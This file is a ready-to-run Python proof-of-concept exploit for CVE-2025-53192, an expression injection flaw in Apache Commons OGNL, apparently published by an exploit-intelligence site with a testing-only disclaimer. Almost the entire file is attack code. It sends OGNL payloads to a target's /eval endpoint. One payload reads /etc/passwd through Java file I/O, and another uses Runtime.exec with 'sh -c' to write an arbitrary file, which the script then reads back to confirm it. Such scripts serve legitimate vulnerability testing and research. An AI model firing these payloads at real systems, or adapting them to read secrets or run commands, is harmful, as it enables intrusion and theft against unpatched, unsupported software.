#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Commons OGNL — Expression Injection to File I/O
# CVE            : CVE-2025-53192
# Vendor         : Apache Software Foundation
# Product        : Apache Commons OGNL
# Affected       : All versions (project retired, no fix)
# Type           : CWE-146 - Expression/Command Delimiter Injection
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-53192 — Vector 4: File I/O (Read + Write) via OGNL

Sub-vector A: Arbitrary file READ via Scanner+File (no shell process needed).
Sub-vector B: Arbitrary file WRITE + verify via OGNL.

PREREQUISITES:
  - Python 3 (stdlib only)
  - Target HTTP service running (docker compose up -d)

USAGE:
  python3 poc_vector4.py <host> <port>
  python3 poc_vector4.py localhost 8531

REFERENCES:
  - CVE-2025-53192
  - https://github.com/advisories/GHSA-5vgh-76mj-8hcq
"""

import sys
import time
import urllib.request
import urllib.error

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"


def ognl_eval(base_url, expression):
    """POST an OGNL expression to the harness and return the response body."""
    url = f"{base_url}/eval"
    req = urllib.request.Request(
        url,
        data=expression.encode("utf-8"),
        headers={"Content-Type": "text/plain"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read().decode("utf-8", errors="replace"), resp.status
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return body, e.code
    except Exception as e:
        return str(e), 0


def check_health(base_url):
    try:
        req = urllib.request.Request(f"{base_url}/health")
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status == 200
    except Exception:
        return False


def exploit(host, port):
    base_url = f"http://{host}:{port}"

    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}  CVE-2025-53192 Vector 4: File I/O via OGNL (no shell for reads){RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print()
    print(f"  {YELLOW}Target:{RESET}        {base_url}")
    print(f"  {YELLOW}Sub-vector A:{RESET} Read /etc/passwd via Scanner+File (pure Java I/O)")
    print(f"  {YELLOW}Sub-vector B:{RESET} Write proof marker file + verify via OGNL")
    print()

    # Health check
    print(f"  [1/3] Checking target...", end=" ")
    if not check_health(base_url):
        print(f"{RED}FAILED{RESET}")
        return False
    print(f"{GREEN}OK{RESET}")

    # === Sub-vector A: Arbitrary file read (no shell needed) ===
    read_expr = 'new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\\\A").next()'

    print(f"  [2/3] Sub-vector A: Reading /etc/passwd via OGNL...", end=" ")
    result_read, status_read = ognl_eval(base_url, read_expr)
    read_ok = status_read == 200 and "root:" in result_read

    if read_ok:
        print(f"{GREEN}OK{RESET}")
    else:
        print(f"{RED}FAILED{RESET}")

    # === Sub-vector B: Write + verify ===
    marker = "CVE-2025-53192-FILE-IO-VECTOR"
    write_expr = (
        '@java.lang.Runtime@getRuntime().exec('
        'new java.lang.String[]{"sh","-c","echo ' + marker + ' > /tmp/ognl-file-io-poc"})'
    )
    verify_expr = 'new java.util.Scanner(new java.io.File("/tmp/ognl-file-io-poc")).useDelimiter("\\\\A").next()'

    print(f"  [3/3] Sub-vector B: Writing + verifying marker file...", end=" ")
    # Write the file
    ognl_eval(base_url, write_expr)
    # Small delay for the async exec() to complete
    time.sleep(0.5)
    # Read it back
    result_verify, status_verify = ognl_eval(base_url, verify_expr)
    write_ok = status_verify == 200 and marker in result_verify

    if write_ok:
        print(f"{GREEN}OK{RESET}")
    else:
        print(f"{RED}FAILED{RESET}")

    # Display results
    print()
    print(f"  {CYAN}[Sub-vector A] Arbitrary File Read (/etc/passwd):{RESET}")
    if read_ok:
        lines = result_read.strip().splitlines()[:5]
        print(f"  {RED}┌──────────────────────────────────────────────{RESET}")
        for line in lines:
            print(f"  {RED}│ {line}{RESET}")
        if len(result_read.strip().splitlines()) > 5:
            print(f"  {RED}│ ... ({len(result_read.strip().splitlines()) - 5} more lines){RESET}")
        print(f"  {RED}└──────────────────────────────────────────────{RESET}")
        print(f"  {GREEN}✓ Arbitrary file read confirmed (no shell process needed){RESET}")
    else:
        print(f"  {RED}✗ File read failed{RESET}")
    print()

    print(f"  {CYAN}[Sub-vector B] Arbitrary File Write + Verify:{RESET}")
    if write_ok:
        print(f"  Written content: {RED}{result_verify.strip()}{RESET}")
        print(f"  {GREEN}✓ Arbitrary file write confirmed{RESET}")
    else:
        print(f"  {RED}✗ File write failed{RESET}")

    overall = read_ok and write_ok
    print()
    if overall:
        print(f"  {GREEN}✓ CVE-2025-53192 File I/O impact confirmed{RESET}")
    return overall


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print(f"Example: {sys.argv[0]} localhost 8531")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    success = exploit(host, port)
    sys.exit(0 if success else 1)
